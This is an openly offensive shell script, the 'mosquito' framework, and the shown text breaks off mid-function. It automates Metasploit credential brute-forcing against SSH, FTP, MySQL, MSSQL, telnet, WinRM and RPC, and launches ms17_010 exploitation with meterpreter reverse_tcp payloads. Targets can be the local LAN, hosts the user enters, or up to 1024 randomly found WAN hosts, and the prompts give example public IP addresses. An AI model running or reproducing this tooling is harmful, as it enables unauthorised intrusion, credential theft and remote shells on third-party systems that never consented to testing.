#!/bin/sh
# Author: r00t-3xp10it
# mosquito framework v:3.14.3 [STABLE]
# Automate remote brute force tasks over WAN/LAN networks
# GitHub: https://github.com/r00t-3xp10it/resource_files
# Suspicious Shell Activity - redteam @2019
##
resize -s 38 120 > /dev/nul



# variable declarations _______________________________________
#                                                             |
OS=`uname`                                                    # grab OS
ver="3.14.3"                                                  # mosquito  version
SaIU=`arch`                                                   # grab arch in use
IPATH=`pwd`                                                   # grab mosquito path
htn=$(hostname)                                               # grab hostname
DiStRo=`awk '{print $1}' /etc/issue`                          # grab distribution -  Ubuntu or Kali
user=`who | awk {'print $1'}`                                 # grab username
EnV=`hostnamectl | grep Chassis | awk {'print $2'}`           # grab environement
InT3R=`netstat -r | grep "default" | awk {'print $8'}`        # grab interface in use
RANGE=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'} | cut -d '.' -f1,2,3` # ip-range parsing
# ____________________________________________________________|



# sellect attacker arch in use
if [ "$SaIU" = "i686" ] || [ "$SaIU" = "x86" ]; then
   ArCh="x86"
else
   ArCh="x64"
fi



## Colorise shell Script outputs
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}



Colors;
## Make sure we are in 'resource_files' working directory
if ! [ -e "logs" ]; then
echo "---"${BlueF}
cat << !
                                                🦟__________       
              _______🦟________________________  ___(_) _  /______🦟
           __  __  __ \  __ \_  ___/  __  /  / / /_  /_  __/  __ \\
         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
           /_/ /_/ /_/\____//____/ \__, / \__,_/ /_/  \__/ \____/v:$ver
                                     /_/ 🦟                             🦟
!
echo ""${Reset};
cat << !
        Before we are abble to install/execute mosquito, we need to download
         🦟mosquito working directory to our machine first and then run it.

!
echo "    ${BlueF}[${YellowF}execute${BlueF}]${white} sudo git clone https://github.com/r00t-3xp10it/resource_files.git"
echo "    ${BlueF}[${YellowF}execute${BlueF}]${white} cd resource_files && sudo chmod +x -R *.sh"
echo "    ${BlueF}[${YellowF}execute${BlueF}]${white} sudo ./mosquito.sh -h"
echo "" && echo "---"
sleep 1
exit
fi


## Arguments menu
time=$(date | awk {'print $4'})
while getopts ":h,:u,:i," opt; do
    case $opt in
        u)
        cd aux
        rm -f install.sh > /dev/nul 2>&1
        wget -qq https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/aux/install.sh
        chmod +x install.sh
        ./install.sh -u # update (install.sh -u)
        exit
        ;;
        i)
        cd aux && ./install.sh # install dependencies (install.sh)
        exit
        ;;
        h)
echo "---"${BlueF}
cat << !
                                                🦟__________       
              _______🦟________________________  ___(_) _  /______🦟
           __  __  __ \  __ \_  ___/  __  /  / / /_  /_  __/  __ \\
         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
           /_/ /_/ /_/\____//____/ \__, / \__,_/ /_/  \__/ \____/v:$ver
                                     /_/ 🦟                             🦟
!
echo ""${Reset};
echo "${BlueF}    ${RedF}:${BlueF}Framework Description_"${Reset};
cat << !
       Mosquito uses metasploit auxiliary modules + nmap nse + resource files
       to be abble to automate remote brute force tasks over WAN/LAN networks.
       'scan Local Lan, scan user inputs (rhosts),Search WAN for random hosts'

!
echo "${BlueF}    ${RedF}:${BlueF}Framework Info_"${Reset};
cat << !
       Author: r00t-3xp10it
       Suspicious Shell Activity🦟redteam @2019🦟
       https://github.com/r00t-3xp10it/resource_files

!
echo "${BlueF}    ${RedF}:${BlueF}Dependencies_"${Reset};
cat << !
       zenity|metasploit|nmap|dig|geoiplookup|http-winrm.nse
       curl|freevulnsearch.nse|multi_services_wordlist.txt

!
echo "${BlueF}    ${RedF}:${BlueF}Limitations_"${Reset};
cat << !
       a) mosquito accepts only ip addr inputs,not domain names
       b) brute force takes time, use 'CTRL+C' to abort scan(s)
       c) mosquito dicionarys can be found under \bin\wordlists
       d) finding valid creds sometimes fails to spanw a shell
       e) having multiple sessions open migth slowdown your pc

!
echo "${BlueF}    ${RedF}:${BlueF}Install/Update_"${Reset};
cat << !
       cd resource_files
       find ./ -name "*.sh" -exec chmod +x {} \;
       update  - sudo ./mosquito.sh -u
       install - sudo ./mosquito.sh -i

!
echo "${BlueF}    ${RedF}:${BlueF}Execution_"${Reset};
cat << !
       sudo ./mosquito.sh
!
echo "---"
        exit
        ;;
        \?)
        echo "${RedF}[x] Invalid option: -${white}$OPTARG"${Reset}; >&2
        exit
        ;;
    esac
done



## Make sure we have installed mosquito
if ! [ -f "aux/install.log" ]; then
echo "---"${BlueF}
cat << !
                                                🦟__________       
              _______🦟________________________  __(_)  _  /______🦟
           __  __  __ \  __ \_  ___/  __  /  / / /_  /_  __/  __ \\
         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
           /_/ /_/ /_/\____//____/ \__, / \__,_/ /_/  \__/ \____/v:$ver
                                     /_/ 🦟                             🦟
!
echo ${white}"---${YellowF}               'Mosquito reports that its ${RedF}not${YellowF} installed'."${Reset};
echo ""
   echo -n "${BlueF}[${YellowF}i${BlueF}] Do you wish to install 🦟mosquito dependencies now? (y/n):"${Reset};read quer
   if [ "$quer" = "y" ] || [ "$quer" = "Y" ]; then
      cd aux && ./install.sh # install dependencies (install.sh)
   fi
fi




###################################################################
#                * 🦟 FRAMEWORK MAIN FUNCTIONS 🦟 *               #
###################################################################
service postgresql start | zenity --progress --pulsate --title "🦟 PLEASE WAIT 🦟" --text="Starting postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1

#
# geo_location funcion
#
sh_one () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} geo_location resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" TRUE "Scan user inputs (rhosts)" FALSE "Scan user input host list (file.txt)" FALSE "Internal ip addr to external ip Resolver" --width 330 --height 200) > /dev/null 2>&1
   #
   ## Sellect the type of scan to use
   #
   if [ "$scan" = "Scan user inputs (rhosts)" ]; then
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 162.246.22.133 104.96.180.140" --width 450) > /dev/null 2>&1
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      packag=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect geolocation package" --radiolist --column "Pick" --column "Option" TRUE "Curl" FALSE "geoiplookup" --width 328 --height 175) > /dev/null 2>&1
         if [ "$packag" = "Curl" ]; then
            echo "${BlueF}[☠]${white} Using curl package to resolve"${Reset};
            msfconsole -q -x "workspace -a mosquito;setg USE_CURL true;setg RHOSTS $rhost;resource geo_location.rc;workspace -d mosquito"
         else
            echo "${BlueF}[☠]${white} Using geoiplookup package to resolve"${Reset};
            msfconsole -q -x "workspace -a mosquito;setg GOOGLE_MAP true;setg RHOSTS $rhost;resource geo_location.rc;workspace -d mosquito"
         fi
   #
   # Scan user input host list (file.txt)
   #
   elif [ "$scan" = "Scan user input host list (file.txt)" ]; then
      echo "${BlueF}[☠]${white} Scanning User input host list (file.txt)"${Reset};
      list=$(zenity --title "🦟 MOSQUITO 🦟" --filename=$IPATH --file-selection --text "chose host list to use") > /dev/null 2>&1
      packag=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect geolocation package" --radiolist --column "Pick" --column "Option" TRUE "Curl" FALSE "geoiplookup" --width 328 --height 175) > /dev/null 2>&1
         if [ "$packag" = "Curl" ]; then
            echo "${BlueF}[☠]${white} Using curl package to resolve"${Reset};
            msfconsole -q -x "workspace -a mosquito;setg USE_CURL true;setg TXT_IMPORT $list;resource geo_location.rc;workspace -d mosquito"
         else
            echo "${BlueF}[☠]${white} Using geoiplookup package to resolve"${Reset};
            msfconsole -q -x "workspace -a mosquito;setg GOOGLE_MAP true;setg TXT_IMPORT $list;resource geo_location.rc;workspace -d mosquito"
         fi
   #
   # Internal ip addr to external ip Resolver (dig)
   #
   elif [ "$scan" = "Internal ip addr to external ip Resolver" ]; then
      echo "${BlueF}[☠]${white} Resolving Internal ip addr to external ip"${Reset};
      packag=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect geolocation package" --radiolist --column "Pick" --column "Option" TRUE "Curl" FALSE "geoiplookup" --width 328 --height 175) > /dev/null 2>&1
         if [ "$packag" = "Curl" ]; then
            echo "${BlueF}[☠]${white} Using curl package to resolve"${Reset};
            msfconsole -q -x "workspace -a mosquito;setg USE_CURL true;setg RESOLVER true;resource geo_location.rc;workspace -d mosquito"
         else
            echo "${BlueF}[☠]${white} Using geoiplookup package to resolve"${Reset};
            msfconsole -q -x "workspace -a mosquito;setg GOOGLE_MAP true;setg RESOLVER true;resource geo_location.rc;workspace -d mosquito"
         fi
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
}



#
# brute_force most common services
#
sh_two () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} brute_force resource_"${Reset};
   sleep 1
   IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;setg LHOST $IPADDR;resource brute_force.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 216.15.177.33 162.246.22.133" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;setg LHOST $IPADDR;resource brute_force.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for targets"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;setg LHOST $IPADDR;resource brute_force.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
}



#
# brute_force ms17_010 (smb) service(s)
#
sh_tree () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} ms17_010 resource_"${Reset};
   sleep 1
   IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   payload=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "\nSellect exploitation Payload:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_tcp" --width 353 --height 195) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;setg LHOST $IPADDR;setg PAYLOAD $payload;resource ms17_010.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 46.147.255.230 194.58.118.182" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;setg LHOST $IPADDR;setg PAYLOAD $payload;resource ms17_010.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;setg LHOST $IPADDR;setg PAYLOAD $payload;resource ms17_010.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
}



#
# Brute Force ssh service :: done
#
sh_quatro () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} ssh_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource ssh_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 147.162.198.31 41.225.253.172" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource ssh_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource ssh_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
}



#
# brute_force ftp service(s) :: done
#
sh_cinco () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} ftp_brute resource_"${Reset};
   sleep 1
   IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;setg LHOST $IPADDR;resource ftp_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 143.191.125.117 183.17.237.229" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;setg LHOST $IPADDR;resource ftp_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 400 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource ftp_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
}



#
# brute_force http (CVE) services :: done
#
sh_six () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} http_CVE resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource http_CVE.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 154.194.198.245 66.199.38.187" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource http_CVE.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource http_CVE.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
}



#
# Brute Force winrm|wsman|wsmans service(s) :: done
#
sh_seven () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} winrm_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   payload=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "\nSellect exploitation Payload:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_tcp" --width 353 --height 195) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;setg PAYLOAD $payload;resource winrm_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 154.208.147.160 205.65.133.91" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;setg PAYLOAD $payload;resource winrm_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 800 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;setg PAYLOAD $payload;resource winrm_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
}



#
# Brute Force mysql service :: done
#
sh_oito () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} mysql_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource mysql_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 213.171.197.190 46.242.242.249" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource mysql_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource mysql_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
}



#
# Brute Force mssql service :: done
#
sh_nine () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} mssql_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource mssql_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 185.99.212.190 180.86.155.12" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource mssql_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource mssql_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
}



#
# Brute Force telnet service :: done
#
sh_ten () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} telnet_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource telnet_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 95.38.18.209 201.18.152.50" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource telnet_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 600 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource telnet_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
}



#
# Brute Force RPC service :: done
#
sh_onze () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} rpc_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
